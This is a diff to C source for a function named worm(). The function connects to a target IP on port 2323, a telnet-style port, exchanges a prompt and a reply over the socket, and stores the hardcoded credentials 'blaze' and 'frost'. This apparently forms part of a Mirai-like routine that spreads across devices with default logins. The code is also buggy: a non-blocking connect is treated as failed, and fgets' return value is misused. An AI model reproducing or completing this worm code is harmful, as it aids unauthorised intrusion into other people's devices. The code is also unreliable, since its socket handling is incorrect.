@@ -140,10 +140,14 @@ bool worm(uint32_t ip){
 
 //Connect to Specific IP with port number 2323
 	int sockfd;
+	int n;
 	struct sockaddr_in servaddr;
+	char buf[81];
+	char input[81];
 
 	if((sockfd=socket(AF_INET,SOCK_STREAM,0))<0)
 	{
+		//printf("socket fail %u \n",ip);
 		return false;
 	}
 
@@ -151,17 +155,38 @@ bool worm(uint32_t ip){
 	servaddr.sin_family=AF_INET;
 	servaddr.sin_port=htons(2323);
 	servaddr.sin_addr.s_addr=ip;
-
-	if(connect(sockfd,&servaddr,sizeof(servaddr))<0)
+	int flag;
+	flag=fcntl(sockfd,F_GETFL,0);
+	if(fcntl(sockfd, F_SETFL,flag|O_NONBLOCK) == -1)
 	{
+		printf("non block fail\n");
 		return false;
 	}
+	if(connect(sockfd,&servaddr,sizeof(servaddr))<0)
+	{
+		//printf("connect fail %u \n",ip);
+
+		return false;
+	}
+
+	//buffer init
+	memset(buf,0,sizeof(buf));
+	n=read(sockfd,buf,81);
+	printf("%s\n",buf);
+	memset(input,0,sizeof(input));
+	n=fgets(input,81,stdin);
+	send(sockfd,input,81,0);
+	memset(buf,0,sizeof(buf));
+	n=read(sockfd,buf,81);
+	printf("%s\n",buf);
+
 
 	ID=strdup("blaze");
 	PW=strdup("frost");
 
 	//Close
-	close(sockfd);	
+	close(sockfd);
+	printf("r\n");
 	return true;
 
 
